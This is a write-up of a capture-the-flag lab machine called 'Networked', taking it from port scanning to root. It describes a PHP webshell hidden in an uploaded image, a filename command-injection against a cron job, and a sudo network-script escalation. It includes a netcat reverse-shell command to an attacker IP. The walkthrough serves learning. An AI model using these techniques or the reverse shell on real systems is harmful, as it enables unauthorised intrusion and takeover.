---
description: Easy machine OSCP style
---

# Networked

## Reconnaissance

Ensuring the machine is up. Is a Linux machine due to the TTL equal to 63 (should be 64).

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.03.21.png" alt=""><figcaption></figcaption></figure>

Scanning for the open ports with nmap. Only ports 22 and 80 are open.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.08.29.png" alt=""><figcaption></figcaption></figure>

With the open ports, we perform a version detection scan to get the versions of the services running on that ports to later look for any vulnerability for that services version.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.10.42.png" alt=""><figcaption></figcaption></figure>

To look for interesting paths into the server directory we use a nmap scan using a script called http-enum and we discover three interesting directories so we start looking into them via any browser.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.20.21.png" alt=""><figcaption></figcaption></figure>

As we can see there is a tar file so we download it to look the content of the backup.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.21.10.png" alt=""><figcaption></figcaption></figure>

Inspecting the content of the backup file we might think it is a backup of the server so we try to acces those paths via the browser again.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.23.59.png" alt=""><figcaption></figcaption></figure>

## Exploiting

At this point apparently we are able to upload an image so we try it.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.25.07.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.30.37.png" alt=""><figcaption></figcaption></figure>

At the path /photos we can see the uploaded images and our image as well. At this point we could use this image that can be uploaded to have two extensions using .php. To do this, we include php code into the image data so having this extension it is going to execute it.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.31.24.png" alt=""><figcaption></figcaption></figure>

First we change the extension of the image to have those mentioned extensions, php and jpg.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.32.41.png" alt=""><figcaption></figcaption></figure>

At any point of the file code we could include php code, in this case using system and cmd as the parameter to execute any command we want.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.34.13 (1).png" alt=""><figcaption></figcaption></figure>

Then we uploaded the image again.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.35.42.png" alt=""><figcaption></figcaption></figure>

To know where the image is stored we inspect the element and then we can access the image raw code.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.36.11.png" alt=""><figcaption></figcaption></figure>

This is the image in raw and at this point, this is where the two extension comes to use, inlcuding code via the URL as a parameter. To test it we execute `ls -l` and it was successfully executed as it can be seen in the image.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.37.33.png" alt=""><figcaption></figcaption></figure>

Using CTRL + U we can better see the result of the execution. Now we can get a shell.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.38.13.png" alt=""><figcaption></figcaption></figure>

So now, we set up a listener on the 443 port using netcat in the host.&#x20;

```
nc -nlvp 443
```

Then, using the URL again, we send as the parameter the netcat command:

```
nc -e /bin/bash 10.10.14.4 443
```

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.40.26.png" alt=""><figcaption></figcaption></figure>

And now we got a shell, but we have to perform some treatment to this shell to convert it to a interactive one.&#x20;

```
#(target)script /dev/null -c bash
CRTL + Z
#(host)stty raw -echo; fg
    reset xterm
#(target)export TERM=xterm
#(target)export SHELL=bash
#(target)stty rows X columns Y
```

At this point we are as apache so we do not have privileges to access the user flag so we need to escalate to guly.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.48.32.png" alt=""><figcaption></figcaption></figure>

As we can see in the content of the crontab file, the user guly is running as root a script called check\_attack.php every 3 minutes.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.49.10.png" alt=""><figcaption></figcaption></figure>

Now inspecting the content of the check\_attack file, we notice that at a point, it is executing system commands to remove all the stored images under the /uploads directory (which we have access). As it is marked in green, it is removinfg the file simply by concatenating the path value and the filename of the images, so it does not perform any sanitization. We could simply create a file called whatever we want and concatenate another command in the name separated with a semicolon so the script will execute it.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 20.51.39.png" alt=""><figcaption></figcaption></figure>

To exploit the vulnerability, we created a file called whatever; \[command] so when the script check\_attack is executed, it is going to send get a shell to the server which will be running in the host machine. In the image below we can see the file which was created to exploit the vulnerability.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.00.44.png" alt=""><figcaption></figcaption></figure>

We set up a listener in the host to receive the shell when crontab executes the script again. Finally, after waiting, we got a shell as guly and we need to perform some steps to get an interactive shell.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.01.34.png" alt=""><figcaption></figcaption></figure>

```
#(target)script /dev/null -c bash
CRTL + Z
#(host)stty raw -echo; fg
    reset xterm
#(target)export TERM=xterm
#(target)export SHELL=bash
#(target)stty rows X columns Y
```

As guly we can get the user flag.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.03.12.png" alt=""><figcaption></figcaption></figure>

## Privilege escalation

Now, to escalate privileges we look for the privileges of the user guly and we notice that it is allowd to execute a file with root privileges and without password. The script is called /changename.sh

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.05.48.png" alt=""><figcaption></figcaption></figure>

Inspecting the content of this file, we can see that it does add some data to a file stored under the /etc/sysconfig/network-scripts/ifcfg-XXXX.

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.06.41.png" alt=""><figcaption></figcaption></figure>

Searching on the Internet, we reached to a web where a user found an issue that enables a user with privileges to write in that directory to become root, which is exactly our situation. Aparently, when the script requests the interface name, we can simply concatenate any command separated by a space and it will be executed.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.11.03.png" alt=""><figcaption></figcaption></figure>

In this case we test with whoamin to prove that it returns the user executing the script.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.12.22.png" alt=""><figcaption></figcaption></figure>

At this point we could simply especify a bash in the interface name to get a shell when the script gets executed.&#x20;

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.13.19.png" alt=""><figcaption></figcaption></figure>

Finally we are root. We just have to find the flag and PWNED!

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.15.06.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Captura de pantalla 2023-02-22 a las 21.14.49.png" alt=""><figcaption></figcaption></figure>
